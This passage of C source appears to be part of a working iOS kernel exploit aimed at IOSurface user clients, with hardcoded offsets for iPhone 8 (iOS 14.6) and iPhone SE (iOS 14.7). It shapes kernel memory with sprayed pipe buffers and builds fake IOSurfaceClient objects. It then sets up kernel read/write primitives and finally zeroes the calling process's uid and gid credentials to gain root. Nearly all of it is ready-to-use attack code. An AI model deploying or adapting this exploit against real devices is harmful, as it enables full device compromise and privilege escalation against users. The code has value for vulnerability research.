         *   [pipe buffer][IOSurfaceClient array]<repeats>[anchor alloc]
         */

        uint64_t guessed_IOSurfaceClientp = current_client_array_guess +
            (sizeof(void *) * target_surface);

        if(!increment32_n(guessed_IOSurfaceClientp, 0x70)){
            printf("%s: failed to increment guessed IOSurfaceClient"
                    " pointer at %#llx\n", __func__,
                    guessed_IOSurfaceClientp);
            return false;
        }

        /* Don't start doing this until we're more than a fourth of
         * the way through the loop since we may hit an unmapped page
         * before then */
        if(i > (iosruc_hole_fillers->len / 4)){
            if(!increment32_n(guessed_IOSurfaceClientp - 0x10000, 0x70)){
                printf("%s: failed to increment guessed IOSurfaceClient"
                        " pointer at %#llx\n", __func__,
                        guessed_IOSurfaceClientp);
                return false;
            }
        }
    }

    /* Leak the pointers we need */
    uint64_t bulk_in = (uint64_t)target_surface;

    uint8_t bulk_out[0x80];
    memset(bulk_out, 0, sizeof(bulk_out));
    size_t bulk_out_sz = sizeof(bulk_out);

    kern_return_t kret = IOConnectCallMethod(mid->iosruc, 28, &bulk_in, 1,
            NULL, 0, NULL, 0, bulk_out, &bulk_out_sz);

    if(kret){
        printf("%s: s_get_bulk_attachments failed: %s\n", __func__,
                mach_error_string(kret));
        return false;
    }

    uint64_t iosr_kaddr = *(uint64_t *)(bulk_out + 0x1c);
    uint64_t iosruc_kaddr = *(uint64_t *)(bulk_out + 0x3c) - 0xf8;
    uint64_t iosc_array_kaddr = *(uint64_t *)(bulk_out + 0x54);
    uint32_t iosc_array_capacity = *(uint32_t *)(bulk_out + 0x5c);

    *iosr_kaddrp = iosr_kaddr;
    *iosruc_kaddrp = iosruc_kaddr;
    *iosc_array_kaddrp = iosc_array_kaddr;
    *iosc_array_capacityp = iosc_array_capacity;

    return true;
}

static bool exploit_stage3(struct array *iosruc_hole_fillers,
        struct array *pipe_hole_fillers, uint64_t anchor_alloc_kaddr,
        uint64_t iosruc_kaddr, uint64_t iosc_array_kaddr,
        uint32_t iosc_array_capacity,
        struct pipe_hole_filler **krw_pipe_hole_fillerp,
        io_connect_t *krw_iosrucp, int *krw_surface_idp){
    /* Create an artifical OOB IOSurfaceClient read with our 32-bit
     * increment. But first we have to fix the IOSurfaceClient pointer
     * in each pipe buffer now that we have a pointer to one of the
     * IOSurfaceClient arrays we sprayed earlier */
    for(int i=0; i<pipe_hole_fillers->len; i++){
        struct pipe_hole_filler *phf = pipe_hole_fillers->items[i];
        uint8_t contents[0x10000];

        if(read(phf->rfd, contents, sizeof(contents)) == -1){
            printf("%s: failed to read pipe %d: %s\n", __func__, i,
                    strerror(errno));
            return false;
        }

        /* This is very likely to point to pipe buffer we control */
        *(uint64_t *)contents = iosc_array_kaddr + 0x10000 + sizeof(uint64_t);

        uint8_t *fake_IOSurfaceClient = contents + sizeof(uint64_t);

        *(uint64_t *)(fake_IOSurfaceClient + 0x40) =
            iosc_array_kaddr + 0x10000 + sizeof(uint64_t) + 0xa0;

        uint8_t *fake_IOSurface = fake_IOSurfaceClient + 0xa0;

        *(uint64_t *)(fake_IOSurface + 0xc0) =
            (iosc_array_kaddr + 0x10000 + sizeof(uint64_t) + 0xa0 + 0x400) - 0x14;

        /* Use the use count to encode the index into the pipe hole fillers
         * so we know which one controls this IOSurface */
        *(uint32_t *)(fake_IOSurface + 0x400) = (0x4141 << 16) | i;

        if(write(phf->wfd, contents, sizeof(contents)) == -1){
            printf("%s: failed to write pipe %d: %s\n", __func__, i,
                    strerror(errno));
            return false;
        }
    }

    uint32_t times = 8193 - iosc_array_capacity;

    if(!increment32_n(iosruc_kaddr + 0x120, times)){
        printf("%s: failed to increase array capacity\n", __func__);
        return false;
    }

    /* Figure out which IOSurfaceRootUserClient corresponds to the
     * IOSurfaceClient array that we can now OOB read from */
    struct pipe_hole_filler *krw_pipe_hole_filler = NULL;
    io_connect_t krw_iosruc = IO_OBJECT_NULL;

    for(int i=0; i<iosruc_hole_fillers->len; i++){
        struct iosruc_hole_filler *ihf = iosruc_hole_fillers->items[i];
        io_connect_t iosruc = ihf->iosruc;

        uint64_t in = 8192;
        uint64_t val = 0;
        uint32_t outcnt = 1;

        kern_return_t kret = IOConnectCallScalarMethod(iosruc, 16, &in, 1,
                &val, &outcnt);

        if(kret)
            continue;

        if(((uint32_t)val >> 16) == 0x4141){
            krw_pipe_hole_filler = pipe_hole_fillers->items[val & 0xff];
            krw_iosruc = iosruc;
            /* printf("%s: found corrupted IOSurfaceRootUserClient handle %#x\n", */
            /*         __func__, krw_iosruc); */
            break;
        }
    }

    if(!krw_iosruc){
        printf("%s: failed, did not find corrupted iosruc\n", __func__);
        return false;
    }

    *krw_pipe_hole_fillerp = krw_pipe_hole_filler;
    *krw_iosrucp = krw_iosruc;
    *krw_surface_idp = 8192;

    return true;
}

/* Kernel read/write constants */
static io_connect_t g_krw_iosruc = IO_OBJECT_NULL;
static int g_krw_surface_pipe_read = 0, g_krw_surface_pipe_write = 0;
static uint32_t g_krw_surface_id = 0;

static bool init_krw(io_connect_t krw_iosruc,
        int krw_surface_pipe_read, int krw_surface_pipe_write,
        uint32_t krw_surface_id){
    g_krw_iosruc = krw_iosruc;
    g_krw_surface_pipe_read = krw_surface_pipe_read;
    g_krw_surface_pipe_write = krw_surface_pipe_write;
    g_krw_surface_id = krw_surface_id;

    return true;
}

static bool kread32(uint64_t kaddr, uint32_t *out){
    if(!g_krw_iosruc){
        printf("%s: init_krw not called yet\n", __func__);
        return false;
    }

    uint8_t contents[0x10000];

    if(read(g_krw_surface_pipe_read, contents, sizeof(contents)) == -1){
        printf("%s: read fail: %s\n", __func__, strerror(errno));
        return false;
    }

    *(uint64_t *)(contents + 0x8 + 0xa0 + 0xc0) = kaddr - 0x14;

    if(write(g_krw_surface_pipe_write, contents, sizeof(contents)) == -1){
        printf("%s: write fail: %s\n", __func__, strerror(errno));
        return false;
    }

    uint64_t in = g_krw_surface_id;
    uint64_t val = 0;
    uint32_t outcnt = 1;

    kern_return_t kret = IOConnectCallScalarMethod(g_krw_iosruc, 16, &in, 1,
            &val, &outcnt);

    if(kret){
        printf("%s: failed reading from %#llx: %s\n", __func__,
                kaddr, mach_error_string(kret));
        return false;
    }

    *out = (uint32_t)val;

    return true;
}

static bool kread64(uint64_t kaddr, uint64_t *out){
    uint32_t low, high;

    if(!kread32(kaddr, &low))
        return false;

    if(!kread32(kaddr + sizeof(uint32_t), &high))
        return false;

    *out = ((uint64_t)high << 32) | low;

    return true;
}

static bool kwrite32(uint64_t kaddr, uint32_t val){
    if(!g_krw_iosruc){
        printf("%s: init_krw not called yet\n", __func__);
        return false;
    }

    uint8_t contents[0x10000];

    if(read(g_krw_surface_pipe_read, contents, sizeof(contents)) == -1){
        printf("%s: read fail: %s\n", __func__, strerror(errno));
        return false;
    }

    *(uint32_t *)(contents + 0x8 + 0xa0 + 0xb0) = 1;
    *(uint64_t *)(contents + 0x8 + 0xa0 + 0xc0) = kaddr - 0x98;

    if(write(g_krw_surface_pipe_write, contents, sizeof(contents)) == -1){
        printf("%s: write fail: %s\n", __func__, strerror(errno));
        return false;
    }

    uint64_t ins[] = { g_krw_surface_id, 0, val };

    kern_return_t kret = IOConnectCallScalarMethod(g_krw_iosruc, 31,
            ins, 3, NULL, NULL);

    if(kret){
        printf("%s: failed writing to %#llx: %s\n", __func__, kaddr,
                mach_error_string(kret));
        return false;
    }

    return true;
}

static bool kwrite64(uint64_t kaddr, uint64_t val){
    uint32_t low = (uint32_t)val;
    uint32_t high = (uint32_t)(val >> 32);

    if(!kwrite32(kaddr, low))
        return false;

    if(!kwrite32(kaddr + sizeof(uint32_t), high))
        return false;

    return true;
}

static bool post_exploit(uint64_t krw_iosruc_kaddr){
    uint64_t slid_iosruc_vtab;

    if(!kread64(krw_iosruc_kaddr, &slid_iosruc_vtab)){
        printf("%s: failed reading iosruc vtable\n", __func__);
        return false;
    }

    printf("%s: iosruc vtab is %#llx\n", __func__, slid_iosruc_vtab);

    slid_iosruc_vtab |= 0xffffff8000000000;

    /* XXX Don't have time to detect this automatically, manually set */
    bool is_new_style_kernel = true;

    uint64_t kslide, kernel_taskp;

    if(is_new_style_kernel){
        /* iPhone 8, 14.6 */
        kslide = slid_iosruc_vtab - 0xfffffff00789a388;
        kernel_taskp = 0xfffffff007729030 + kslide;
    }
    else{
        /* iPhone SE (2016), 14.7 */
        kslide = slid_iosruc_vtab - 0xfffffff006e2fb10;

        uint64_t kernel_taskpp = slid_iosruc_vtab - 0x1980;

        if(!kread64(kernel_taskpp, &kernel_taskp)){
            printf("%s: old: failed reading kernel_task pointer\n", __func__);
            return false;
        }
    }

    printf("%s: kernel slide is %#llx\n", __func__, kslide);

    uint64_t kernel_task;

    if(!kread64(kernel_taskp, &kernel_task)){
        printf("%s: failed reading kernel_task\n", __func__);
        return false;
    }

    kernel_task |= 0xffffff8000000000;

    printf("%s: kernel task struct is at %#llx\n", __func__, kernel_task);

    uint64_t kernel_proc;

    if(!kread64(kernel_task + 0x398, &kernel_proc)){
        printf("%s: failed reading kernel proc pointer\n", __func__);
        return false;
    }

    kernel_proc |= 0xffffff8000000000;

    printf("%s: kernel proc struct is at %#llx\n", __func__, kernel_proc);

    uint64_t curproc;

    if(!kread64(kernel_proc + 0x8, &curproc)){
        printf("%s: failed reading kernproc->le_prev\n", __func__);
        return false;
    }

    curproc |= 0xffffff8000000000;

    uint64_t myproc;

    pid_t pid, mypid = getpid();

    do {
        if(!kread32(curproc + 0x68, (uint32_t *)&pid)){
            printf("%s: fail reading pid for proc struct %#llx\n",
                    __func__, curproc);
            return false;
        }

        myproc = curproc;

        if(!kread64(curproc + 0x8, &curproc)){
            printf("%s: failed reading next proc\n", __func__);
            return false;
        }

        curproc |= 0xffffff8000000000;
    } while (pid != mypid);

    printf("%s: my proc struct is at %#llx\n", __func__, myproc);

    uint64_t mytask;

    if(!kread64(myproc + 0x10, &mytask)){
        printf("%s: could not read my task struct\n", __func__);
        return false;
    }

    mytask |= 0xffffff8000000000;

    printf("%s: my task struct is at %#llx\n", __func__, mytask);

    uint64_t mycreds;

    if(!kread64(myproc + 0xf0, &mycreds)){
        printf("%s: could not read my creds struct\n", __func__);
        return false;
    }

    mycreds |= 0xffffff8000000000;

    printf("%s: my creds are at %#llx\n", __func__, mycreds);

    uid_t uid = getuid();
    gid_t gid = getgid();

    printf("%s: before: uid = %d, gid = %d\n", __func__, uid, gid);

    if(!kwrite32(mycreds + 0x18, 0)){
        printf("%s: failed zeroing uid\n", __func__);
        return false;
    }

    if(!kwrite32(mycreds + 0x1c, 0)){
        printf("%s: failed zeroing ruid\n", __func__);
        return false;
    }

    if(!kwrite32(mycreds + 0x20, 0)){
        printf("%s: failed zeroing svuid\n", __func__);
        return false;
    }

    if(!kwrite32(mycreds + 0x68, 0)){
        printf("%s: failed zeroing rgid\n", __func__);
        return false;
    }

    if(!kwrite32(mycreds + 0x6c, 0)){
        printf("%s: failed zeroing svgid\n", __func__);
        return false;
    }

    uid = getuid();
    gid = getgid();

    printf("%s: after: uid = %d, gid = %d\n", __func__, uid, gid);

    return true;
}

static void exploit(void){
    uint64_t anchor_alloc_kaddr;
    struct array *iosruc_hole_fillers;
    struct array *pipe_hole_fillers;

    if(!exploit_stage1(&iosruc_hole_fillers, &pipe_hole_fillers,
                &anchor_alloc_kaddr)){
#ifdef SAMPLING_MEMORY
        printf("%s: failed to sample kernel_map\n", __func__);
#else
        printf("%s: failed to shape kva space\n", __func__);
#endif
        return;
    }

#ifdef SAMPLING_MEMORY
    return;
#endif

    printf("%s: Shaped KVA space\n", __func__);

    uint64_t iosr_kaddr, iosruc_kaddr, iosc_array_kaddr;
    uint32_t iosc_array_capacity;

    if(!exploit_stage2(iosruc_hole_fillers, &iosr_kaddr,
                &iosruc_kaddr, &iosc_array_kaddr,
                &iosc_array_capacity)){
        printf("%s: stage2 failed, we will panic\n", __func__);
        return;
    }

    printf("%s: stage2 success\n", __func__);

    /* printf("%s: stage2 success\n" */
    /*        "\tIOSurfaceRoot pointer:                %#llx\n" */
    /*        "\tIOSurfaceRootUserClient:              %#llx\n" */
    /*        "\t\tIOSurfaceClient array:              %#llx\n" */
    /*        "\t\tIOSurfaceClient array capacity:     %d\n", */
    /*        __func__, iosr_kaddr, iosruc_kaddr, iosc_array_kaddr, */
    /*        iosc_array_capacity); */

    struct pipe_hole_filler *krw_pipe_hole_filler;
    io_connect_t krw_iosruc;
    int krw_surface_id;

    if(!exploit_stage3(iosruc_hole_fillers, pipe_hole_fillers,
                anchor_alloc_kaddr, iosruc_kaddr, iosc_array_kaddr,
                iosc_array_capacity, &krw_pipe_hole_filler,
                &krw_iosruc, &krw_surface_id)){
        printf("%s: stage3 failed, we will panic\n", __func__);
        return;
    }

    printf("%s: stage3 success\n", __func__);

    if(!init_krw(krw_iosruc, krw_pipe_hole_filler->rfd,
                krw_pipe_hole_filler->wfd, krw_surface_id)){
        printf("%s: could not init kernel read/write prims\n", __func__);
        return;
    }

    printf("%s: kernel read/write prims set up\n"
           "   read kernel memory with kread32/64\n"
           "   write kernel memory with kwrite32/64\n", __func__);

    if(!post_exploit(iosruc_kaddr)){
        printf("%s: post exploit failed, we will panic\n", __func__);
        return;
    }
}

static int increase_file_limit(void){
    struct rlimit rl = {0};

    int err = getrlimit(RLIMIT_NOFILE, &rl);

    if(err){
        printf("%s: getrlimit: %s\n", __func__, strerror(errno));
        return err;
    }

    rl.rlim_cur = OPEN_MAX;
    rl.rlim_max = OPEN_MAX;

    err = setrlimit(RLIMIT_NOFILE, &rl);

    if(err){
        printf("%s: setrlimit: %s\n", __func__, strerror(errno));
        return err;
    }

    return 0;
}

int main(int argc, char **argv){
    if(increase_file_limit()){
        printf("Failed to increase file limits\n");
        return 1;
    }

    struct utsname u;
    uname(&u);

    printf("%s %s %s\n", u.release, u.version, u.machine);

    exploit();

    for(;;);
    return 0;
}
